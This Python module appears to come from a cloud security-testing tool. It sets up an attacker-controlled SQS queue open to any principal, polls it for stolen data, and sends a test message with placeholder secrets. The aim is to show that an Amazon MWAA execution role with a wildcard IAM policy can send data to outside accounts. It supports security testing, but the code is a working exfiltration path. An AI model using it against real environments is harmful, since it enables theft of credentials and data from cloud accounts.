"""
Module 1: Data Exfiltration Testing

Tests the ability to exfiltrate data from an MWAA environment to an
attacker-controlled SQS queue, exploiting the wildcard account ID
in the default IAM policy.

Supports two modes:
  - setup:   Creates the attacker-side receiving queue and sets policy
  - listen:  Polls the receiving queue for exfiltrated data
  - deploy:  Generates and uploads the exfiltration DAG to the target S3 bucket
  - test:    End-to-end test sending a test message directly (no MWAA needed)
"""

import json
import time
from typing import Optional

from ..config import AttackerConfig, DEFAULT_EXFIL_QUEUE
from ..utils import (
    get_sqs_client,
    create_test_queue,
    set_queue_policy_allow_cross_account,
    delete_test_queue,
    receive_messages,
    send_message,
    print_section,
    print_success,
    print_fail,
    print_info,
    print_warn,
    print_result,
    logger,
)


def setup_receiver(attacker: AttackerConfig, queue_name: str = DEFAULT_EXFIL_QUEUE) -> str:
    """Create the attacker-side SQS queue to receive exfiltrated data."""
    print_section("Exfiltration Receiver Setup")
    sqs = get_sqs_client(attacker.region, attacker.profile)

    queue_url = create_test_queue(sqs, queue_name)

    # Get the queue ARN for the policy
    attrs = sqs.get_queue_attributes(QueueUrl=queue_url, AttributeNames=["QueueArn"])
    queue_arn = attrs["Attributes"]["QueueArn"]

    set_queue_policy_allow_cross_account(sqs, queue_url, queue_arn)

    print_success(f"Exfiltration receiver queue ready: {queue_url}")
    print_info(f"Queue ARN: {queue_arn}")
    print_info("This queue accepts cross-account SendMessage from any principal.")
    print_info("Deploy the exfiltration DAG to the target MWAA environment to test.")

    return queue_url


def listen(
    attacker: AttackerConfig,
    queue_name: str = DEFAULT_EXFIL_QUEUE,
    duration: int = 300,
    poll_interval: int = 5,
) -> list:
    """Poll the exfiltration queue and display received data."""
    print_section("Exfiltration Listener")
    sqs = get_sqs_client(attacker.region, attacker.profile)
    queue_url = attacker.queue_url(queue_name)

    print_info(f"Listening on: {queue_url}")
    print_info(f"Duration: {duration}s | Poll interval: {poll_interval}s")
    print_info("Waiting for exfiltrated data...\n")

    collected = []
    start = time.time()

    while time.time() - start < duration:
        messages = receive_messages(sqs, queue_url, max_messages=10, wait_seconds=poll_interval, delete_after=True)
        for msg in messages:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            print_success(f"[{timestamp}] Data received!")
            try:
                body = json.loads(msg["Body"])
                print(json.dumps(body, indent=4))
            except json.JSONDecodeError:
                print(f"    Raw: {msg['Body']}")
            collected.append(msg)
        if not messages:
            elapsed = int(time.time() - start)
            remaining = duration - elapsed
            if remaining > 0:
                print(f"\r  [i] Waiting... ({remaining}s remaining)", end="", flush=True)

    print(f"\n\n  Total messages received: {len(collected)}")
    return collected


def test_direct_send(
    attacker: AttackerConfig,
    queue_name: str = DEFAULT_EXFIL_QUEUE,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> bool:
    """
    Send a test exfiltration message directly (simulates what the DAG would do).

    Uses source_profile credentials to simulate the MWAA execution role sending
    data to the attacker's queue. If source_profile is None, uses default credentials.
    """
    print_section("Direct Exfiltration Test")

    # The sender simulates the MWAA execution role
    sender_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )
    queue_url = attacker.queue_url(queue_name)

    test_payload = {
        "test": True,
        "source": "mwaa_security_tool",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "simulated_secret": "AKIAxxxxxxxxEXAMPLE",
        "simulated_db_password": "test-poc-password-12345",
        "description": "This is a proof-of-concept exfiltration test message.",
    }

    print_info(f"Target queue: {queue_url}")
    print_info("Sending test exfiltration payload...")

    try:
        response = sender_sqs.send_message(
            QueueUrl=queue_url,
            MessageBody=json.dumps(test_payload),
            MessageAttributes={
                "Source": {
                    "DataType": "String",
                    "StringValue": "mwaa-security-tool-poc",
                },
            },
        )
        msg_id = response["MessageId"]
        print_success(f"Message sent successfully! MessageId: {msg_id}")
        print_success("FINDING: Cross-account SQS SendMessage succeeded.")
        print_warn("The MWAA execution role can exfiltrate data to external queues.")
        return True

    except Exception as e:
        error_code = getattr(e, "response", {}).get("Error", {}).get("Code", "Unknown")
        print_fail(f"SendMessage failed: {error_code} - {e}")
        if error_code == "AccessDenied":
            print_info("Access denied - the policy may have been hardened.")
        return False


def cleanup(attacker: AttackerConfig, queue_name: str = DEFAULT_EXFIL_QUEUE) -> None:
    """Remove the attacker-side exfiltration queue."""
    print_section("Exfiltration Cleanup")
    sqs = get_sqs_client(attacker.region, attacker.profile)
    queue_url = attacker.queue_url(queue_name)
    try:
        delete_test_queue(sqs, queue_url)
        print_success("Exfiltration queue deleted.")
    except Exception as e:
        print_fail(f"Cleanup failed: {e}")
